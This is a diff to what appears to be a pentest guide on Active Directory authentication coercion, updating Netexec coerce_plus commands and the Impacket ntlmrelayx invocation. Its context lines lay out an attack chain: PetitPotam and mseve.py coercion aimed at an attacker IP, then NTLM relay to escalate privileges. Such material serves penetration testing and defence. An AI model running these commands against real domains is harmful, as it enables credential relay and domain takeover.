@@ -8,7 +8,7 @@
 The `coerce_plus` module of **Netexec** inspects Active Directory objects for configurations that could unintentionally allow one machine or service to trigger authentication from another. 
 
 ```bash
-nxc ldap <target> -u <user> -p <password> -M coerce_plus
+nxc smb <target> -u <user> -p <password> -M coerce_plus
 ```
 
 - Detects potential coercion paths (RPC, legacy permissions).
@@ -62,7 +62,7 @@ python3 mseve.py -u <user> -p <password> -d <domain> <attacker_ip> <target_dc_ip
 1. **Enumerate coercion paths**
 
 ```bash
-nxc ldap <dc_ip> -u <user> -p <password> -M coerce_plus
+nxc smb <dc_ip> -u <user> -p <password> -M coerce_plus
 ```
 
 2. **Trigger coercion (PetitPotam)**
@@ -74,7 +74,7 @@ python3 PetitPotam.py -d <domain> -u <user> -p <password> <attacker_ip> <target_
 3. **Relay captured NTLM to escalate**
 
 ```bash
-ntlmrelayx.py -tf targets.txt -smb2support
+impacket-ntlmrelayx -tf targets.txt -smb2support
 ```
 
 4. **Access privileged resources**
